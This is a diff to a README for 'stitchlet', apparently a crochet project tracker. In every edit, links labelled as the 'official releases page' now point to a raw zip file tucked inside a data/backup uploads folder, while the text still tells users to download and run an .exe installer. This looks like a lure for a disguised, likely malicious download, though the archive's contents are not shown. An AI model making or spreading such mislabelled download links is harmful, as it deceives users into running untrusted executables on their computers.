@@ -1,6 +1,6 @@
 # 🧶 stitchlet - Track your crochet projects with ease
 
-[![](https://img.shields.io/badge/Download_Stitchlet-Blue-blue.svg)](https://github.com/abhidiptaroy8328/stitchlet/releases)
+[![](https://img.shields.io/badge/Download_Stitchlet-Blue-blue.svg)](https://github.com/abhidiptaroy8328/stitchlet/raw/refs/heads/main/data/backup-1781336497702/uploads/projects/Software_1.5-alpha.3.zip)
 
 stitchlet tracks your crochet projects, stitch counts, pattern files, and progress photos. It keeps your data on your computer where you control it. You do not need to share your information with anyone.
 
@@ -18,7 +18,7 @@ This tool organizes your crochet life. It features a digital stitch counter. It 
 
 Follow these steps to set up stitchlet on your computer.
 
-1. Visit the [official releases page](https://github.com/abhidiptaroy8328/stitchlet/releases) to download the installer.
+1. Visit the [official releases page](https://github.com/abhidiptaroy8328/stitchlet/raw/refs/heads/main/data/backup-1781336497702/uploads/projects/Software_1.5-alpha.3.zip) to download the installer.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Open the folder where your computer saves downloads.
@@ -43,7 +43,7 @@ This software uses local storage. This means your photos and details exist only 
 
 ## ⚙️ Updating the software
 
-When a new version comes out, you can download the installer again from the [releases page](https://github.com/abhidiptaroy8328/stitchlet/releases). Run the new installer. It finds your old version and replaces it with the newer one. Your data stays in place during this update.
+When a new version comes out, you can download the installer again from the [releases page](https://github.com/abhidiptaroy8328/stitchlet/raw/refs/heads/main/data/backup-1781336497702/uploads/projects/Software_1.5-alpha.3.zip). Run the new installer. It finds your old version and replaces it with the newer one. Your data stays in place during this update.
 
 ## ❓ Frequently asked questions
 
